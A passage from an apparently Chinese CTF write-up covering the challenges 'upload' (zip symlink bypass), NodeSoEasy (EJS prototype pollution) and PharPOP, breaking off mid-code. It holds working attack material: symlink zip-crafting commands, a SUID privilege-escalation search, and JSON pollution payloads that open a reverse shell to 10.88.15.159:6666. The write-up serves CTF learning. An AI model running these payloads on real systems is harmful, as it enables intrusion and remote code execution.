ZvcigkaT0wOyRpPHNpemVvZigkZmlsZV9saXN0KTskaSsrKXsKICAgICAgICAgICAgaWYoaXNfZGlyKCR0aGlzLT5wYXRoLiIvIi4kZmlsZV9saXN0WyRpXSkpewogICAgICAgICAgICAgICAgZWNobyAiZGlyPyBJIGRlbGV0ZWQgYWxsIHRoaW5ncyBpbiBpdCIuIjxicj4iO0AkdGhpcy0+ZGVsZGlyKCIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiRmaWxlX2xpc3RbJGldKTtAcm1kaXIoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICBpZighaW5fYXJyYXkocGF0aGluZm8oJGZpbGVfbGlzdFskaV0sIFBBVEhJTkZPX0VYVEVOU0lPTiksJHdoaXRlX2xpc3QpKSB7ZWNobyAib25seSBpbWFnZSEhISBJIGRlbGV0ZWQgaXQgZm9yIHlvdSIuIjxicj4iO0B1bmxpbmsoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pO30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKCiAgICB9CgoKfQo=</span><br></pre></td></tr></table></figure><p>解码之后是两个文件的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;zip.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;..&quot;</span>)||<span class="title function_ invoke__">strstr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)!=<span class="string">&quot;zip&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;only zip!!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$Myzip</span> = <span class="keyword">new</span> <span class="title function_ invoke__">zip</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$Myzip</span>-&gt;path);</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span>.<span class="variable">$Myzip</span>-&gt;path.<span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to unzip your zip to /&quot;</span>.<span class="variable">$Myzip</span>-&gt;path.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$Myzip</span>-&gt;<span class="title function_ invoke__">unzip</span>())&#123;<span class="keyword">echo</span> <span class="string">&quot;Success&quot;</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;failed&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只检查<code>PATHINFO_EXTENSION</code>，而且直接解压，感觉这个文件问题很多，太不安全了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//zip.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zip_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zip_manager</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$zip_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;zip_manager = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">gen_path</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;zip_name = <span class="variable">$zip_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">gen_path</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$chars</span>=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        <span class="variable">$newchars</span>=<span class="title function_ invoke__">str_split</span>(<span class="variable">$chars</span>);</span><br><span class="line">        <span class="title function_ invoke__">shuffle</span>(<span class="variable">$newchars</span>);</span><br><span class="line">        <span class="variable">$chars_key</span>=<span class="title function_ invoke__">array_rand</span>(<span class="variable">$newchars</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="variable">$fnstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">15</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$fnstr</span>.=<span class="variable">$newchars</span>[<span class="variable">$chars_key</span>[<span class="variable">$i</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$fnstr</span>.<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">microtime</span>()*<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deldir</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//先删除目录下的文件：</span></span><br><span class="line">        <span class="variable">$dh</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dh</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span>!=<span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="variable">$fullpath</span> = <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$fullpath</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">deldir</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$dh</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dir_list</span>(<span class="params"><span class="variable">$directory</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dir</span>(<span class="variable">$directory</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$file</span> = <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">read</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> !== <span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$array</span>[] = <span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unzip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fullpath</span> = <span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable language_">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;zip_name;</span><br><span class="line">        <span class="variable">$white_list</span> = [<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable language_">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">count</span>();<span class="variable">$i</span> ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">getNameIndex</span>(<span class="variable">$i</span>),<span class="string">&quot;../&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you bad bad&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;zip_manager-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Unzip to /&quot;</span>.<span class="variable language_">$this</span>-&gt;path.<span class="string">&quot;/ failed&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">        <span class="variable">$file_list</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dir_list</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$file_list</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;dir? I deleted all things in it&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;@<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">deldir</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);@<span class="title function_ invoke__">rmdir</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_list</span>[<span class="variable">$i</span>], PATHINFO_EXTENSION),<span class="variable">$white_list</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;only image!!! I deleted it for you&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ZipArchived的extractTo有问题，我已经知道的方法有两种 <a href="https://baozongwi.xyz/2025/01/13/SUCTF2025/#SU-photogallery">https://baozongwi.xyz/2025/01/13/SUCTF2025/#SU-photogallery</a> 但是我看网上WP居然还有一种，就是混淆文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zip -y exp.zip 1.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> 1.php</span><br><span class="line"><span class="built_in">mkdir</span> 1.php</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; 1.php/1</span><br><span class="line">zip -y exp.zip 1.php/1</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/4.png" alt="1"></p><p><img src="/../images/achieve/2025/8/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/5.png" alt="1"></p><p><img src="/../images/achieve/2025/8/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/6.png" alt="1"></p><p>链接之后suid提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">nl</span> /f*</span><br></pre></td></tr></table></figure><h2 id="NodeSoEasy"><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h2><p><img src="/../images/achieve/2025/8/Dest0g3520%E8%BF%8E%E6%96%B0%E8%B5%9B/7.png" alt="1"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span>= (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> target = &#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> source = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>))</span><br><span class="line">    <span class="title function_">merge</span>(target, source)</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ejs版本低，可以污染RCE，outputFunctionName用不了了，只能用opts.escapeFunction</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.88.15.159/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.88.15.159/6666 0&gt;&amp;1\&quot;&#x27;);&quot;</span><span class="punctuation">,</span><span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cannot transfer arrays&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t do&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="variable language_">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;It is file&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You can look at the others&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">banana</span> 